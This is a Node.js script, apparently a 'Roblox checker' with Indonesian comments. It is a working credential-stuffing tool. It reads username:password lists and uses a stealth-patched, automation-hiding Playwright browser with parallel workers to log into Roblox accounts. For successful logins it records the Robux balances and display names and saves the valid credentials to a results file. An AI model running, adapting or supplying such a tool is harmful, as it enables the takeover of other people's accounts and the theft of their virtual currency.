import { chromium } from 'playwright-extra';
import stealth from 'puppeteer-extra-plugin-stealth';
import chalk from "chalk";
import gradient from "gradient-string";
import dayjs from "dayjs";
import fs from "fs";

// Paksa warna aktif di terminal VPS/Windows
process.env.FORCE_COLOR = "3";

chromium.use(stealth());

const FILE_PATH = 'list.txt';

function displayBanner() {
    console.clear();
    const seaBlue = gradient(['#00FFFF', '#0080FF', '#000080']);
    console.log(seaBlue(`
    ██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗
    ██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝
    ██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ 
    ██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ 
    ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗
    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
    ROBLOX ULTRA CHECKER - Deep Ocean Identity
    Power: Extreme Stable | https://github.com/Paizutempest
    `));
}

const log = {
    info: (msg) => console.log(`${chalk.cyan('ℹ')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    success: (msg) => console.log(`${chalk.green('✔')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    warn: (msg) => console.log(`${chalk.yellow('⚠')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    error: (msg) => console.log(`${chalk.red('✖')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    process: (msg) => console.log(`${chalk.blue('⚙')} [${dayjs().format('HH:mm:ss')}] ${chalk.italic(msg)}...`)
};

async function worker(accounts, browser) {
    while (accounts.length > 0) {
        if (!browser.isConnected()) break;

        const entry = accounts.shift();
        if (!entry || !entry.includes(':')) continue;
        
        // Sinkronisasi list.txt secara real-time
        fs.writeFileSync(FILE_PATH, accounts.join('\n'));

        //const [rawUser, password] = entry.split(':');
        //const username = rawUser.split('@')[0];
        const [username, password] = entry.split(':');
        let context;
        try {
            context = await browser.newContext({
                viewport: { width: 1280, height: 720 },
                deviceScaleFactor: 1
            });
            const page = await context.newPage();

            // Block resources agar enteng (Tanpa merubah logika)
            await page.route('**/*', (route) => {
                const type = route.request().resourceType();
                if (['image', 'media', 'font', 'stylesheet', 'other'].includes(type)) route.abort();
                else route.continue();
            });

            // Navigasi dengan timeout lebih panjang (60s)
            await page.goto('https://www.roblox.com/id/login', { waitUntil: 'commit', timeout: 60000 });

            // Tunggu form login siap
            await page.waitForSelector('#login-username', { timeout: 30000 });

     // Isi username/email secara utuh dulu biar gak kepotong
await page.fill('#login-username', username);
// Kasih delay dikit biar sistem napas
await page.waitForTimeout(500);

// Isi password secara utuh
await page.fill('#login-password', password);
await page.waitForTimeout(500);

// Klik tombol login
await page.click('#login-button');

            // Tunggu feedback (Disesuaikan dengan logika if-else kamu)
            await page.waitForTimeout(5000);

            const errorElement = page.locator('#login-form-error');
            const isLocked = await page.isVisible('.modal-dialog:has-text("Notifikasi Keamanan")');

            if (await errorElement.isVisible()) {
                const rawError = await errorElement.innerText();
                log.error(`[${username}] INVALID - ${rawError.trim()}`);
            } else if (isLocked) {
                log.warn(`[${username}] ${chalk.bgYellow.black(' LOCKED ')}`);
                saveResult(username, password, 'Security Check', '0');
            } else if (page.url().includes('/home')) {
                await page.waitForSelector('#nav-robux-amount', { timeout: 15000 }).catch(() => {});
                const robux = await page.$eval('#nav-robux-amount', el => el.innerText.trim()).catch(() => "0");
                const displayName = await page.$eval('.age-bracket-label-username', el => el.innerText.trim()).catch(() => "Unknown");

                log.success(`[${username}] SUCCESS | Robux: ${robux}`);
                saveResult(username, password, displayName, robux);
            }
        } catch (err) {
            log.error(`[${username}] Worker Error: ${err.message.substring(0, 50)}`);
            if (entry) accounts.push(entry); // Masukkan balik jika error timeout
        } finally {
            if (context) await context.close().catch(() => {});
        }
    }
}

function saveResult(user, pass, name, robux) {
    const data = `${user}:${pass} | Name: ${name} | Robux: ${robux} | Date: ${dayjs().format('YYYY-MM-DD HH:mm')}\n`;
    fs.appendFileSync('roblox_results.txt', data);
}

async function start() {
    displayBanner();
    
    if (!fs.existsSync(FILE_PATH)) {
        log.error("File list.txt tidak ditemukan!");
        return;
    }

    let accounts = fs.readFileSync(FILE_PATH, 'utf8').split('\n').filter(line => line.trim() !== '');
    

    const threadCount = process.argv[2] || "3"; 
    const limit = parseInt(threadCount);

    log.info(`Launching ${chalk.magenta(limit)} Workers...`);

    const browser = await chromium.launch({ 
        headless: false, 
        args: [
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--window-size=1280,720',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--no-first-run',
            '--no-zygote',
            '--mute-audio',
            '--js-flags="--max-old-space-size=512"' 
        ]
    });

    const workers = [];
    for (let i = 0; i < limit; i++) {
        // Jeda 500ms tiap spawn agar tidak crash saat buka banyak page
        await new Promise(r => setTimeout(r, 500)); 
        workers.push(worker(accounts, browser));
    }

    await Promise.all(workers);
    await browser.close();
    log.success("List telah diproses semua!");
}

start();